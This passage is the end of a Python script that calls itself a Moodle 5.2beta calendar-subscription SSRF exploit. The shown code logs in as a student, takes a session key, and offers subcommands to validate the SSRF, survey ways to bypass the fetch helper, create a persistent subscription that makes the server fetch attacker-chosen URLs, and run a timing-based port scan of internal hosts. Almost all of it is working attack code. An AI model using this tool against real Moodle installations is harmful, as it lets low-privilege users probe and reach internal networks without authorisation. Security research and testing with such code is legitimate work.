            time.sleep(0.2)
        med = statistics.median(times)
        if last_v == "SUBSCRIBED":
            label, col = "OPEN (HTTP 200)", G
        elif last_v == "HELPER_BLOCKED":
            label, col = "helper blocked", R
        elif med > threshold:
            label, col = "OPEN (slow)", G
        else:
            label, col = "closed/non-200", D
        ss = " ".join(f"{t:.3f}" for t in times)
        print(f"{C}│{X}  {p:<7}{ss:<28}{med:>6.3f}s  {col}{label}{X}")
    foot()


def parse_ports(s):
    out = []
    for p in s.split(","):
        p = p.strip()
        if "-" in p:
            a, b = p.split("-", 1)
            out.extend(range(int(a), int(b) + 1))
        else:
            out.append(int(p))
    return sorted(set(out))


# ─── main ────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="Moodle 5.2beta calendar subscription SSRF exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("validate", help="prove SSRF fires from student account")
    sub.add_parser("bypass-survey", help="helper bypass matrix")

    s = sub.add_parser("subscribe", help="create persistent SSRF subscription")
    s.add_argument("url", help="URL Moodle will fetch periodically")

    ps = sub.add_parser("portscan", help="timing-based port scan")
    ps.add_argument("--host", default="ssrf1-target")
    ps.add_argument("-p", "--ports", default="80,443,22,3306,6379,8080")
    ps.add_argument("--samples", type=int, default=3)
    ps.add_argument("--timeout", type=float, default=10.0)

    args = ap.parse_args()
    cfg = load_config()

    step(f"login as {cfg['user']['username']} (student-level) at {cfg['base']}")
    sess = moodle_login(cfg["base"], cfg["user"]["username"], cfg["user"]["password"])
    ok("session ok")
    sesskey = get_sesskey(sess, cfg["base"])
    ok(f"sesskey = {sesskey[:10]}…")
    foot()

    {"validate":      lambda: cmd_validate(args, sess, cfg, sesskey),
     "bypass-survey": lambda: cmd_bypass_survey(args, sess, cfg, sesskey),
     "subscribe":     lambda: cmd_subscribe(args, sess, cfg, sesskey),
     "portscan":      lambda: cmd_portscan(args, sess, cfg, sesskey),
     }[args.cmd]()


if __name__ == "__main__":
    main()

```
